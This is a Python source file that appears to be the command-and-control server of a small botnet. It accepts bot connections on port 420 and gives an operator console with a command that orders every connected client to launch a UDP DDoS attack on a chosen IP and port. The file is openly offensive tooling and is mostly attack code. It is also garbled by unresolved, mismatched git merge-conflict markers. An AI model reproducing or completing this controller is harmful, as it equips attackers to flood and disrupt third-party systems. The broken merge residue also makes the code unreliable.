import socket
import threading
import os
import pickle

# creates server socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("0.0.0.0", 420))
sock.listen(1)

<<<<<<< HEAD
c = None
a = None

while c == None:
    c, a = sock.accept()
    print("listen")
=======
cons = []
adds = []

# listens for new connections and dedicates a thread to them
def listener():
    while True:
        c, a = sock.accept()
        if c != None:
            cons.append(c)
            adds.append(a)
            c = None

def check():
    global cons
    for i in range(0, len(cons)):
        try:
            cons[i].send("are you alive?".encode("utf-8"))
        except:
            cons.pop(i)

def send_all(command):
    for i in range(len(cons)):
        cons[i].send(command)

def userInterface():
    while True:
        print(">", end="")
        command = input().lower().split(" ")
        if command[0] == "help":
            print()
            print("ADDS           Shows a list of every connected ip address.")
            print("CLS            Clears command prompt.")
            print("CONS           number of connections")
            print("EXIT           Exits server.")
            print("HELP           Shows list of commands.")
            print("MSG            Sends a costom message to all connections.")
            print("UDP            Starts a DDoS attack using UDP")
            print()
        elif command[0] == "cls":
            os.system("cls")
        elif command[0] == "exit":
            exit(0)
        elif command[0] == "msg":
            try:
                check()
                send_all(pickle.dumps((command[0], command[1])))
            except:
                print("MSG {message}", end="\n\n")
        elif command[0] == "udp":
            try:
                check()
                send_all(pickle.dumps((command[0], command[1], int(command[2]), command[3])))
            except:
                print("UDP {ip} {port} {message}", end="\n\n")

if __name__ == "__main__":
<<<<<<< HEAD
    threading.Thread(target=listener).start()
    threading.Thread(target=userInterface).start()
>>>>>>> yes
=======
    threading.Thread(target=listener, daemon=True).start()
    threading.Thread(target=userInterface).start()
>>>>>>> yes
